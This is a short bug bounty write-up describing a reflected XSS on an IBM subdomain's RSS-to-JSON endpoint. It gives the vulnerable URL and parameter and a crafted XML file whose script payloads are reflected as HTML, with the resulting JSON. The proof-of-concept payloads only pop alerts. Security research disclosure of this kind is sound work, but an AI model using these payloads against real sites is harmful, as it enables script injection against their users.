---
title: " [IBM] XSS Reflected via xml files"
date: 2020-10-26T17:55:28+08:00
description: "simple writeup about XSS Reflected on ibm subdomain"
tags: ["bugbounty","security","webpentesting"]
type: post
weight: 25
showTableOfContents: true
---

Hello World :wave:
while I'm doing some bug hunting on IBM subdomains I decided instead of using subdomain enumeration I can get interesting endpoints and parameters from `waybackurls` to shorten the time, after reading the URLs from waybackurls I noticed a lot of endpoints that contain some URLs of XML files in `rssurl` parameter

```
https://www-356.ibm.com/partnerworld/wps/servlet/pwdyn/pw/rss/rsstojson.jsp?ccdb=no&rssurl=https://www-2000.ibm.com/file.xml&_=1596170198353
```


![ibm_xml](https://1.bp.blogspot.com/-7Dz0qMUTtE0/X5bYy8O2QfI/AAAAAAAAEYw/gioHZXy_lps0DyITLNrJhQFlaCXmV-GHwCLcBGAsYHQ/s1600/Screenshot_at_2020-08-09_18-52-24.png)

all this API endpoint do is read the XML from the URL and then return its value of it but in JSON, for the first time I thought there was an SSRF but after a lot of trying to bypass it, it doesn't work at all



![noway](https://media.tenor.com/RTdXxzgoQewAAAAC/chihuahua-basal.gif)


but from another side, I noticed that the response `Content-type` is `text/HTML` so I think I can do an xss here, the idea is I can make an XML file that contains the xss payload in one of the variables so after converting it to JSON it will be reflected in the page as an HTML code, like this `{"data": "<script>alert(123)</script>"}`

```XML
<html>
	<head></head>
	<body>
		<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
		<a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(2)</a:script>
		<info>
		  <name>
		    <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
		  </name>
		    <description>
		      <value>Hello</value>
		    </description>
		    <url>
		      <value>http://google.com</value>
		    </url>
		</info>
	</body>
</html>
```


then upload the file to my site and pass the URL to the rssurl parameter



the file should be converted like this 

```JSON
{
  "html": {
    "head": "",
    "body": {
      "script": [
        "alert(1)",
        "alert(2)"
      ],
      "info": {
        "name": {
          "value": {
            "__cdata": "<script>confirm(document.domain)</script>"
          }
        },
        "description": {
          "value": "Hello"
        },
        "url": {
          "value": "http://google.com"
        }
      }
    }
  }
}
```
and boom


![xss_boom](https://1.bp.blogspot.com/-BHQh_JQb0Uc/X5bZv80_nnI/AAAAAAAAEY8/hn-Ok2MGjcca4ixkIZpeUgQ1kqCYH5OvwCLcBGAsYHQ/s1600/Screenshot_at_2020-08-09_18-54-51.png)






see ya :crossed_fingers: :heart:
